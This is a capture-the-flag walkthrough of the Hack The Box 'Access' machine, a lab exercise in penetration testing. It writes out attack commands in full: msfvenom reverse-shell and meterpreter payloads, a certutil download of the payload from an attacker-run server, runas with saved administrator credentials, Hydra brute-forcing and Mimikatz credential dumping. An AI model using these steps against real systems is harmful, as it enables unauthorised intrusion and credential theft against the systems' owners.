---
description: https://www.hackthebox.eu/home/machines/profile/156
---

# Access

## Initial Nmap scan

```
nmap -A -T4 10.10.10.98

PORT   STATE  SERVICE VERSION
21/tcp open   ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open   telnet?
53/tcp closed domain
80/tcp open   http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Anonymous login is allowed on port 21 so we can take a look here. As port 80 is running we can start `Gobuster` first just so we make good use of time.

![Running Gobuster](<../../../.gitbook/assets/image (17) (1) (1).png>)

## FTP

Logging in as anonymous on FTP we find two files in the "backups" and "Engineer" folders. Its important to take note of what the output is telling us when grabbing the backup.mdb file as it informs us the file may not have transferred correctly.

![](<../../../.gitbook/assets/image (19) (1) (1).png>)

I came across the following link which points us in the right direction on how to best download particular file types from FTP: [https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files](https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files)

We should attempt to download both files again issuing the `binary` command before download the files. As per the above link the `binary` command should be issued before downloading the following file types:

* image files (e.g. .jpg, .bmp, .png)
* sound files (e.g. .mp3, .avi, .wma)
* video files (eg. .flv, .mkv, .mov, .mp4),
* archive files (e.g. .zip, .rar, .tar)
* other files (e.g. .exe, .doc, .xls, .pdf, etc.)

Firstly I tried to open the ZIP file with `John` as its password protected however, was unable to find a password in the rockyou.txt wordlist. Before exploring any other wordlists I will check out the backup.mdb file.

We have multiple ways of extracting the information from this file and in this instance we will use the following [https://www.mdbopener.com](https://www.mdbopener.com)

After upload the file I found some interesting information in the "auth\_users" table.

![](<../../../.gitbook/assets/image (20) (1) (1).png>)

First thing I tried was the credentials on the zip file. The password "access4u@security" allowed me to extract the ZIP file into a PST file. We can then use the Linux command `readpst <file>` to convert this into a MBOX file.

![](<../../../.gitbook/assets/image (21) (1) (1).png>)

We can run `cat` on the mbox file and we find the following information:

![](<../../../.gitbook/assets/image (22) (1) (1).png>)

From above we gain the following information

Email accounts , possible user account and the password 4Cc3ssC0ntroller. I compiled gathered passwords and potential users accounts and ran these against Hydra.

![](<../../../.gitbook/assets/image (23) (1) (1).png>)

Looks like we have some valid credentials against Telnet. After logging in with Telnet we gain access as the user "security"

![](<../../../.gitbook/assets/image (24) (1) (1).png>)

From here we can `cd` to the Desktop and grab the user flag.

The telnet shell is not too nice to use so I created a reverse TCP shell in `msfvenom` and uploaded it with `certutil.exe`When attempting to execute the shell we was blocked by Group Policy.

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe > shell.exe
```

Lets set up a Python HTTP server on the directory where the payload has been created.

![](<../../../.gitbook/assets/image (28) (1) (1).png>)

Now we can run the following command to download the payload onto the Windows machine.

```
certutil.exe -urlcache -split -f "http://0.0.0.0/shell.exe
```

From here I attempted to run the payload and was stopped by Group Policy.

![](<../../../.gitbook/assets/image (25) (1) (1).png>)

As Group Policy is enabled and the server has a large amount of updates installed it may be worth us looking for privilege escalation through misconfiguration.

After some standard enumeration checks we see that when running `cmdkey /list` that the Administrator has stored credentials.

![](<../../../.gitbook/assets/image (26) (1) (1).png>)

Lets run `net user` to see if a password is required for this account:

![](<../../../.gitbook/assets/image (27) (1) (1).png>)

As we can see "Password required" is set to "No" so we can issue commands on behalf of the local administrator account without having the password. We should now be able to execute our shell using the `runas`command.

Originally I tried this next part using a `netcat` handler but, every time I got a connection back the shell was unstable or simply did not show any output after the initial connection success message. At this point I instead decided to go for a meterpreter shell handler.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe > met.exe
```

I rqn the payload and uploaded it to the Windows Server and executed it as admin with the following command:

```
runas /savecred /noprofile /user:ACCESS\Administrator met.exe
```

We are now connected as the Administrator. I then used the `getsystem` command to gain shell as "NT AUTHORITY / System". At this point I was expecting to grab the root flag on the administrators Desktop. Instead the root.txt file was encrypted using EFS and I kept getting permission denied when attempting to read the contents.

I reset the box and tried again and got the same issue. I was unable to work out how to remove the EFS from the file even when running as System and Administrator. the Cipher thumbprint for the Administrator account and the Cipher used on the root.txt file was the same and I was still unable to remove the encrpytion.

I was unsure if how we was connecting with the reverse shell might be having any effect on the file so from here I loaded `Mimikatz` into the shell and dumped all the credentials.

We can load this in Meterpreter using the `load kiwi` command. We can then run `creds_all` to get the following output:

![](<../../../.gitbook/assets/image (29) (1) (1).png>)

We should now be able to start a fresh telnet session using these credentials.

![](<../../../.gitbook/assets/image (216) (1).png>)
